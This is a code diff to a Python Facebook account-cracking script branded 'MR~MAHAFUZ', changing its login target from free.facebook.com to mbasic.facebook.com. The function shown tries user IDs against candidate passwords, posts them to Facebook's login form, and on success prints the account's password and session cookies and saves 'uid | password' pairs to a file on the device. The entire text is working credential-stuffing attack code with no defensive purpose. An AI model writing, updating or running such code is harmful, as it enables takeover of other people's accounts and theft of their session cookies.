@@ -208,7 +208,7 @@ def mumit2(uid,pwx,tl):
             session = requests.Session()
             sys.stdout.write('\r\033[38;5;46m[MR~MAHAFUZ]--[%s/%s]--[CP%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -219,7 +219,7 @@ def mumit2(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
     'method':'GET',
     'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
     'scheme':'https',
@@ -241,13 +241,13 @@ def mumit2(uid,pwx,tl):
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'user-agent': pro,}
-            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
                 print(f'\033[1;96m[\033[1;92mMR-MAHAFUZ-OK-☺️\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
-                os.system("espeak -a 200 \"congratulation, OK ID\"")
+                os.system('espeak -a 300 "Congratulations. ok id"')
                 print(f'\033[1;36mᏟϴϴᏦᏆᎬ-🤩- : \033[1;35m'+coki)
                 open('/sdcard/mahafuz-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
